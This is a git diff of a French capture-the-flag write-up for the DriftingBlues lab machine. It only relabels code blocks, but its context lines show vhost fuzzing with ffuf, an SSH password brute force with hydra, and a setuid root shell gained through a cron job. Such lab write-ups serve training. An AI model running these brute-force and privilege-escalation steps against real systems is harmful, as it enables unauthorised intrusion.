@@ -42,7 +42,7 @@ Le site *dcode.fr* dispose [d'un interpréteur](https://www.dcode.fr/langage-ook
 
 Voyons un peu les virtual hosts qui retournent une réponse différente de celle par défaut (à savoir ici une taille différente de 7710 octets) :  
 
-```
+```console
 $ ffuf -w /fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.6/ -H "Host: FUZZ.driftingblues.box" -fs 7710 
 
         /'___\  /'___\           /'___\        
@@ -98,7 +98,7 @@ sheryl once told me that she added a number to the end of the password.
 
 C'est toujours un plaisir de résoudre un problème avec une ligne de Python :  
 
-```
+```console
 $ python3 -c "[print(f'1mw4ckyyucky{i}') for i in range(10)]" > pass.txt
 $ hydra -L users.txt -P pass.txt ssh://192.168.56.6
 --- snip ---
@@ -137,7 +137,7 @@ chmod 4755 /tmp/g0tr00t
 
 On attend que la tâche CRON s'exécute et on a notre shell :  
 
-```
+```console
 eric@driftingblues:/tmp$ ./g0tr00t -p 
 g0tr00t-4.3# id 
 uid=1001(eric) gid=1001(eric) euid=0(root) groups=1001(eric) 
